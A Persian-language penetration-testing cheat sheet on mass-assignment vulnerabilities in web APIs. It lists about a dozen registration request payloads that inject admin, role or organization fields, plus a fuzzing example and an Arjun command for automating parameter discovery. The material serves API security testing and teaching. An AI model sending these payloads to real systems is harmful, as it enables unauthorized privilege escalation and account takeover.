# 25.MASS ASSIGNMENT

این اسیب پذیری رو در این موارد امتحان کنید

```
ایجاد حساب کاربری
به سازمان ها Unauthorized دسترسی
بازیابی پسورد
لاگین
تغییر ایمیل
تغییر یوزنیم
```

ایجاد حساب ریکوئست اولیه:

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"password":"Password1!"
}
```

تلاش 1

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"password":"Password1!"
}
```

تلاش 2

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ADMIN": true,
"password":"Password1!"
}
```

تلاش 3

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"isadmin": true,
"password":"Password1!"
}
```

تلاش 4

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ISADMIN": true,
"password":"Password1!"
}
```

تلاش 5

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"Admin": true,
"password":"Password1!"
}
```

تلاش 6

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": admin,
"password":"Password1!"
}
```

تلاش 7

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": ADMIN,
"password":"Password1!"
}
```

تلاش 8

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": administrator,
"password":"Password1!"
}
```

تلاش 9

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": administrator,
"password":"Password1!"
}
```

تلاش 10

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": admin,
"password":"Password1!"
}
```

تلاش 11

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": 1,
"password":"Password1!"
}
```

دسترسی Unauthorized به سازمان ها:

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"org": "§CompanyA§",
"password":"Password1!"
}
```

پیدا کردن متغیرها در داکیومنت

با خواندن داکیومنت میتونید متغیر رو پیدا کنید

فاز کردن متغیرهای ناشناخته

یکی دیگه از سناریوهای رایج اینه که شما یک کاری رو در یک وب اپلیکیشن انجام میدید, ریکوئست رو intercept میکنید و چندین هدر یا پارامتر اضافی رو داخلش قرار میدید
مثل:

```
POST /create/user
--snip--
{
"username": "hapi_hacker"
"pass": "ff7ftw",
"uam": 1,
"mfa": true,
"account": 101
}
```

خودکار کردن حملات Mass Assignment با Arjun و burp Suite Intruder

```bash
arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```